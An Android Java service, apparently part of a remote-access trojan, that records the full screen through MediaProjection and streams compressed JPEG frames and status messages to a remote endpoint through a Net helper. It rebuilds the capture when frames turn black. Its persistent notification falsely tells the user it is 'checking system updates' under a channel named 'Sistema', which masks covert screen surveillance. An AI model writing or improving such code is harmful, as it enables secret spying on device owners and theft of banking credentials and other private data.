package com.aval.seg;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.util.DisplayMetrics;
import android.view.WindowManager;

import java.io.ByteArrayOutputStream;

public class ScreenSvc extends Service {

    public static volatile boolean alive;
    public static volatile boolean black;
    public static volatile boolean giveUp;
    public static volatile int Q = 42;
    public static volatile int FPS = 8;

    private static final int TARGET_W = 720;
    private static final int MAX_RESTARTS = 3;

    private MediaProjection mp;
    private VirtualDisplay vd;
    private ImageReader ir;
    private HandlerThread th;
    private Handler bh;
    private int w, h, dpi, sw, sh;
    private long last;
    private int blackCount;
    private int restarts;

    private final MediaProjection.Callback cb = new MediaProjection.Callback() {
        @Override public void onStop() {
            alive = false;
            black = false;
            Net.send("{\"t\":\"err\",\"o\":\"projecao encerrada pelo sistema\"}");
        }
    };

    @Override public IBinder onBind(Intent i) { return null; }

    @Override public void onCreate() {
        super.onCreate();
        th = new HandlerThread("scr");
        th.start();
        bh = new Handler(th.getLooper());
    }

    @Override public int onStartCommand(Intent it, int f, int s) {
        if (it == null) {
            alive = false;
            stopSelf();
            return START_NOT_STICKY;
        }
        giveUp = false;
        restarts = 0;
        startFg();
        try {
            MediaProjectionManager mpm =
                    (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            mp = mpm.getMediaProjection(it.getIntExtra("code", 0),
                    (Intent) it.getParcelableExtra("data"));
            if (mp == null) {
                alive = false;
                Net.send("{\"t\":\"err\",\"o\":\"getMediaProjection nulo\"}");
                stopSelf();
                return START_NOT_STICKY;
            }
            mp.registerCallback(cb, bh);

            DisplayMetrics dm = new DisplayMetrics();
            ((WindowManager) getSystemService(WINDOW_SERVICE))
                    .getDefaultDisplay().getRealMetrics(dm);

            w = dm.widthPixels;
            h = dm.heightPixels;
            dpi = dm.densityDpi;
            sw = Math.min(TARGET_W, w) & ~1;
            sh = Math.max(2, (h * sw / w) & ~1);

            mirror();
            Net.send("{\"t\":\"info\",\"o\":\"projecao iniciada " + w + "x" + h + "\"}");
        } catch (Throwable t) {
            alive = false;
            Net.send("{\"t\":\"err\",\"o\":\"start: " + Util.esc(String.valueOf(t)) + "\"}");
            stopSelf();
        }
        return START_NOT_STICKY;
    }

    private void mirror() {
        try {
            ir = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 3);
            ir.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
                @Override public void onImageAvailable(ImageReader r) { onImg(r); }
            }, bh);
            int flags = DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR;
            if (restarts >= 2) flags |= DisplayManager.VIRTUAL_DISPLAY_FLAG_PUBLIC;
            vd = mp.createVirtualDisplay("av", w, h, dpi, flags, ir.getSurface(), null, bh);
            alive = true;
            black = false;
            blackCount = 0;
        } catch (Throwable t) {
            alive = false;
            Net.send("{\"t\":\"err\",\"o\":\"mirror: " + Util.esc(String.valueOf(t)) + "\"}");
        }
    }

    private void rebuild() {
        try { if (vd != null) { vd.setSurface(null); vd.release(); } } catch (Throwable ignored) {}
        try { if (ir != null) ir.close(); } catch (Throwable ignored) {}
        vd = null;
        ir = null;
        last = 0;
        mirror();
    }

    private static boolean dark(Bitmap b) {
        int bw = b.getWidth(), bh2 = b.getHeight();
        int sx = Math.max(1, bw / 10), sy = Math.max(1, bh2 / 10);
        long sum = 0;
        int n = 0;
        for (int y = sy / 2; y < bh2; y += sy)
            for (int x = sx / 2; x < bw; x += sx) {
                int c = b.getPixel(x, y);
                sum += ((c >> 16) & 0xff) + ((c >> 8) & 0xff) + (c & 0xff);
                n++;
            }
        return n > 0 && sum / (n * 3) < 8;
    }

    private void onImg(ImageReader r) {
        Image img = null;
        Bitmap full = null;
        Bitmap out = null;
        try {
            img = r.acquireLatestImage();
            if (img == null) return;
            if (giveUp) return;
            long now = System.currentTimeMillis();
            if (now - last < 1000 / Math.max(1, FPS)) return;
            last = now;

            Image.Plane p = img.getPlanes()[0];
            int ps = p.getPixelStride();
            int bw = p.getRowStride() / ps;

            full = Bitmap.createBitmap(bw, h, Bitmap.Config.ARGB_8888);
            full.copyPixelsFromBuffer(p.getBuffer());
            if (bw != w) {
                Bitmap c = Bitmap.createBitmap(full, 0, 0, w, h);
                full.recycle();
                full = c;
            }
            out = Bitmap.createScaledBitmap(full, sw, sh, true);

            if (dark(out)) {
                if (++blackCount > 10) {
                    black = true;
                    if (blackCount == 20) {
                        if (restarts < MAX_RESTARTS) {
                            restarts++;
                            Net.send("{\"t\":\"info\",\"o\":\"frame preto, rebuild " + restarts + "\"}");
                            rebuild();
                        } else if (!giveUp) {
                            giveUp = true;
                            alive = false;
                            Net.send("{\"t\":\"err\",\"o\":\"projecao falhou, usando screenshot\"}");
                        }
                    }
                }
            } else {
                blackCount = 0;
                black = false;
            }

            ByteArrayOutputStream bo = new ByteArrayOutputStream();
            out.compress(Bitmap.CompressFormat.JPEG, Q, bo);
            Net.sendBin(bo.toByteArray());
        } catch (Throwable ignored) {
        } finally {
            if (out != null && out != full) out.recycle();
            if (full != null) full.recycle();
            if (img != null) { try { img.close(); } catch (Throwable ignored) {} }
        }
    }

    private void startFg() {
        String ch = "av";
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            nm.createNotificationChannel(new NotificationChannel(ch, "Sistema", NotificationManager.IMPORTANCE_LOW));
        }
        Notification.Builder nb = Build.VERSION.SDK_INT >= 26
                ? new Notification.Builder(this, ch)
                : new Notification.Builder(this);
        Notification n = nb.setContentTitle("Verificando atualizacoes do sistema")
                .setSmallIcon(R.mipmap.ic).setOngoing(true).build();
        try {
            if (Build.VERSION.SDK_INT >= 29)
                startForeground(1, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
            else
                startForeground(1, n);
        } catch (Throwable t) {
            Net.send("{\"t\":\"err\",\"o\":\"startForeground: " + Util.esc(String.valueOf(t)) + "\"}");
        }
    }

    @Override public void onDestroy() {
        alive = false;
        black = false;
        try { if (vd != null) vd.release(); } catch (Throwable ignored) {}
        try { if (ir != null) ir.close(); } catch (Throwable ignored) {}
        try { if (mp != null) mp.stop(); } catch (Throwable ignored) {}
        try { if (th != null) th.quitSafely(); } catch (Throwable ignored) {}
        super.onDestroy();
    }
}